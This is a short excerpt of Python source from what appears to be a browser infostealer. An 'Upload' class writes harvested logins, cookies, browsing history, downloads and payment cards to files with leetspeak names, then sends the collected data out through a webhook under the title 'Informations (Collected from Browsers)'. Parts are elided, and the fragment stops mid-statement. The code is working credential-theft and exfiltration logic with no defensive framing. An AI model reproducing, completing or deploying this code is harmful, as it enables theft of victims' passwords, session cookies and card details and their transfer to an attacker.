...
class Upload:
    ...
    def write_files(self):
        ...
        if __LOGINS__:
            with open("info\\l0g1ns.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("info\\c00k13s.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("info\\w3b_h1st0ry.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("info\\d0wnlo4ds.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("info\\c4rd5.txt", "w", encoding="utf-8") as f:
    ...
    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Informations (Collected from Browsers)",
                color=0xFFD966,
                description="```" +
